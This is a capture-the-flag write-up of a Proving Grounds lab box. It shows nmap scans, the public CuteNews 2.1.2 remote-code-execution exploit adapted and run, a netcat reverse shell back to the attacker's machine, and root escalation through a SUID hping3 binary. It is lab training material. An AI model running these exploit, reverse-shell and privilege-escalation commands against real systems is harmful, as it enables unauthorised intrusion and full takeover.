# IP:  192.168.103.128

## Enumeration

### Nmap
```javascript
┌──(dx㉿kali)-[~]
└─$ nmap -p- --min-rate 10000 192.168.103.128
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-09 06:28 EDT
Nmap scan report for 192.168.103.128
Host is up (0.16s latency).
Not shown: 65337 filtered tcp ports (no-response), 194 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
110/tcp open  pop3
995/tcp open  pop3s

Nmap done: 1 IP address (1 host up) scanned in 33.52 seconds 

                                                                      
┌──(dx㉿kali)-[~]
└─$ nmap -p 22,80,110,995 -sCV 192.168.103.128 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-09 06:31 EDT
Nmap scan report for 192.168.103.128
Host is up (0.27s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 04:d0:6e:c4:ba:4a:31:5a:6f:b3:ee:b8:1b:ed:5a:b7 (RSA)
|   256 24:b3:df:01:0b:ca:c2:ab:2e:e9:49:b0:58:08:6a:fa (ECDSA)
|_  256 6a:c4:35:6a:7a:1e:7e:51:85:5b:81:5c:7c:74:49:84 (ED25519)
80/tcp  open  http     Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
110/tcp open  pop3     Courier pop3d
|_pop3-capabilities: UIDL TOP IMPLEMENTATION(Courier Mail Server) UTF8(USER) LOGIN-DELAY(10) USER PIPELINING STLS
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-09-17T16:28:06
|_Not valid after:  2021-09-17T16:28:06
|_ssl-date: TLS randomness does not represent time
995/tcp open  ssl/pop3 Courier pop3d
|_pop3-capabilities: UIDL TOP PIPELINING LOGIN-DELAY(10) USER UTF8(USER) IMPLEMENTATION(Courier Mail Server)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-09-17T16:28:06
|_Not valid after:  2021-09-17T16:28:06
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.91 seconds
                                                                      
```

#### SITE Enumeration

#### TCP_80



![bbscute-site-proving-ground](https://user-images.githubusercontent.com/98345027/189332509-bebc13f3-2192-4ed0-90cd-d95912e9a36e.png)

`` Robots.txt page shows error, Bruteforcing the hidden directory by dirb``

#### DIRB
```javascript
```

```javascript
1. /index.php directory found 
```
#### Login-Page

![bbscute-login-php-provingground](https://user-images.githubusercontent.com/98345027/189337805-9602bba7-43d1-40a9-90b6-dc0f5cc8a309.png)

`` The Login-page reveals that it was build in Cute News v2.1.2``

### Exploitation

```javascript
┌──(dx㉿kali)-[~]
└─$ searchsploit Cute News 2.1   
--------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                 |  Path
--------------------------------------------------------------------------------------------------------------- ---------------------------------
CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)                                                   | php/remote/46698.rb
CuteNews 2.1.2 - Arbitrary File Deletion                                                                       | php/webapps/48447.txt
CuteNews 2.1.2 - Authenticated Arbitrary File Upload                                                           | php/webapps/48458.txt
CuteNews 2.1.2 - Remote Code Execution                                                                         | php/webapps/48800.py
--------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

`` Downloading the RCE python exploit in our attacker machine kali Linux``
```javascript
┌──(dx㉿kali)-[~/Desktop/Proving-ground]
└─$ searchsploit -m 48800.py   
  Exploit: CuteNews 2.1.2 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/48800
     Path: /usr/share/exploitdb/exploits/php/webapps/48800.py
File Type: Python script, ASCII text executable

Copied to: /home/dx/Desktop/Proving-ground/48800.py

```

`` Before using it we have to make some changes in exploit code, since it targets the /CuteNews/ directory``
```python
def register():
    global sess, ip
    userpass = "".join(random.SystemRandom().choice(string.ascii_letters + string.digits ) for _ in range(10))
    postdata = {
        "action" : "register",
        "regusername" : userpass,
        "regnickname" : userpass,
        "regpassword" : userpass,
        "confirm" : userpass,
        "regemail" : f"{userpass}@hack.me"
    }
    register = sess.post(f"{ip}/CuteNews/index.php?register", data = postdata, allow_redirects = False)
    if 302 == register.status_code:
        print (f"[+] Registration successful with username: {userpass} and password: {userpass}")
```
`` Based on the Location of index.php page, the software is installed in webrrot of the server and not in the /CuteNews/ directory. We'll delete that directory from exploit code``
```bash
                                                                      
┌──(dx㉿kali)-[~/Desktop/Proving-ground]
└─$ sed -i 's:CuteNews/::g' 48800.py

                                                                      
┌──(dx㉿kali)-[~/Desktop/Proving-ground]
└─$ grep CuteNews 48800.py         
                                           
```
`` Now we run the exploit ``
``The Exploit need the target url , we supply the ip address of the machine``
```javascript
                                                                      
┌──(dx㉿kali)-[~/Desktop/Proving-ground]
└─$ python3 48800.py           



           _____     __      _  __                     ___   ___  ___
          / ___/_ __/ /____ / |/ /__ _    _____       |_  | <  / |_  |
         / /__/ // / __/ -_)    / -_) |/|/ (_-<      / __/_ / / / __/
         \___/\_,_/\__/\__/_/|_/\__/|__,__/___/     /____(_)_(_)____/
                                ___  _________
                               / _ \/ ___/ __/
                              / , _/ /__/ _/
                             /_/|_|\___/___/




[->] Usage python3 expoit.py

Enter the URL> http://192.168.103.128
================================================================
Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
================================================================
[-] No hashes were found skipping!!!
================================================================

=============================
Registering a users
=============================
[+] Registration successful with username: MlewE0MbVX and password: MlewE0MbVX

=======================================================
Sending Payload
=======================================================
signature_key: e97531d92273801db5cbb92fb557a295-MlewE0MbVX
signature_dsi: 000460c11f7433f51588aae295dfb157
logged in user: MlewE0MbVX
============================
Dropping to a SHELL
============================

command > whoami
www-data

command > 

```
`` We have achieved remote code execution via this primitive web shell. Next, let's upgrade this shell into a full reverse shell. ``

#### Reverse-shell

`` First Check whether netcat is installed or not on that machine, though it is ``
```bash

command > which nc
/usr/bin/nc


```
``Let's set up a Netcat listener on port 4444 and then connect back to our attack machine using our web shell.``
```bash
command > nc 192.168.49.103  4444 -e /bin/bash

```
`` Our Listener received the reverse shell
```bash
┌──(dx㉿kali)-[~]
└─$ nc -lvp 4444
listening on [any] 4444 ...
192.168.103.128: inverse host lookup failed: Unknown host
connect to [192.168.49.103] from (UNKNOWN) [192.168.103.128] 56152
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@cute:/var/www/html/uploads$ 

```
#### USer-Flag
```bash
www-data@cute:/$ cd /var/
cd /var/
www-data@cute:/var$ ls -la
ls -la
total 48
drwxr-xr-x 12 root root  4096 Sep 17  2020 .
drwxr-xr-x 18 root root  4096 Sep 17  2020 ..
drwxr-xr-x  2 root root  4096 Jan 26  2021 backups
drwxr-xr-x 12 root root  4096 Sep 17  2020 cache
drwxr-xr-x 38 root root  4096 Jan 21  2021 lib
drwxrwsr-x  2 root staff 4096 Jul 10  2020 local
lrwxrwxrwx  1 root root     9 Sep 17  2020 lock -> /run/lock
drwxr-xr-x 10 root root  4096 Sep  9 12:27 log
drwxrwsr-x  2 root mail  4096 Jan 20  2021 mail
drwxr-xr-x  2 root root  4096 Sep 17  2020 opt
lrwxrwxrwx  1 root root     4 Sep 17  2020 run -> /run
drwxr-xr-x  6 root root  4096 Sep 17  2020 spool
drwxrwxrwt  2 root root  4096 Sep  2 05:31 tmp
drwxr-xr-x  3 root root  4096 Jan 26  2021 www
www-data@cute:/var$ cd www
cd www
www-data@cute:/var/www$ ls -la
ls -la
total 16
drwxr-xr-x  3 root     root     4096 Jan 26  2021 .
drwxr-xr-x 12 root     root     4096 Sep 17  2020 ..
drwxr-xr-x  9 www-data users    4096 Sep 18  2020 html
-rw-r--r--  1 www-data www-data   33 Sep  9 12:27 local.txt
www-data@cute:/var/www$ cat local.txt
cat local.txt
```

### Escalation
`` We Start the Local Enumeration with an SUID binary search ``
```bash
www-data@cute:/var/www$ find / -type f -perm -u=s 2>/dev/null
find / -type f -perm -u=s 2>/dev/null
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/mount
/usr/sbin/hping3
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device

```
`` We find that /usr/sbin/hping3  has a suid bit set so it will help me to escalate the priviledge``
`` Reference: https://gtfobins.github.io/gtfobins/hping3/ ``

#### Root SHell
```javascript
www-data@cute:/var/www$ /usr/sbin/hping3
/usr/sbin/hping3
hping3> 

hping3> /bin/sh -p
/bin/sh -p
# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
# whoami
whoami
root
# 

```


